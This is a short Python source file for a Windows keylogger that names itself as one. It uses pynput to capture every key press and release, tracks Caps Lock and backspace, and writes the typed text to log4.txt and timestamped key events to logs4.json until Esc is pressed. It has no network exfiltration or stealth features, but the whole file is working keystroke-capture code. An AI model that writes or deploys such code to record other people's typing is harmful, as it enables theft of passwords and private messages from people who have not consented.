from pynput import keyboard
import json
from datetime import datetime
import ctypes

def get_caps_lock_state():
    return ctypes.windll.user32.GetKeyState(0x14) & 0xFFFF != 0

key_list = []
x = False
key_strokes = ""
caps_lock_state = get_caps_lock_state()

def update_txt_file(key):
    global caps_lock_state
    key = str(key).replace("'", "")
    if key == 'Key.space':
        key = ' '
    if 'Key.shift' in key or 'Key.ctrl' in key or 'Key.alt' in key:
        key = ''
    if key == 'Key.enter':
        key = '\n'
    if key == 'Key.esc':
        key = ''
    if key == 'Key.caps_lock':
        caps_lock_state = not caps_lock_state  # Toggle the Caps Lock state
        key = ''
    # Swap the case of the key if Caps Lock is active
    if caps_lock_state and key.isalpha():
        key = key.swapcase()

    with open('log4.txt', 'a') as key_stroke:
        key_stroke.write(key)

def update_json_file(key_list):
    with open('logs4.json', 'a') as file:
        current_datetime = datetime.now()
        formatted_date_time = current_datetime.strftime("%Y-%m-%d %H:%M:%S")
        json_writer = json.JSONEncoder()
        file.write(f'Updated On: {formatted_date_time}\n')
        json.dump(key_list, file)
        file.write('\n')

def on_press(key):
    global x, key_list
    if x == False:
        key_list.append({'Pressed': f'{key}'})
        x = True
    if x == True:
        key_list.append({'Held': f'{key}'})
    if key == keyboard.Key.esc:
        update_json_file(key_list)
        return False

def on_release(key):
    global x, key_list, key_strokes
    key_list.append({'Released': str(key)})
    if x == True:
        x = False
    if key == keyboard.Key.esc:
        update_json_file(key_list)
        return False

    if key == keyboard.Key.backspace:
        # Remove the last character from the 'log4.txt' file
        with open('log4.txt', 'r') as f:
            lines = f.read()
        with open('log4.txt', 'w') as f:
            f.write(lines[:-1])  # Remove the last character from the text file
    else:
        key_strokes = str(key)
        update_txt_file(key_strokes)

def save_logs():
    global key_list
    update_txt_file(f'Updated On: {datetime.now().strftime("%Y-%m-%d %H:%M:%S")}\n')

def new_line():
    global key_list
    update_txt_file('\n')

save_logs()
print("[+] Running Keylogger Successfully!\n[!] Saving the logs in 'logs4.json'")
print("PRESS ESC TO SAVE KEYLOGS")

with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()

new_line()
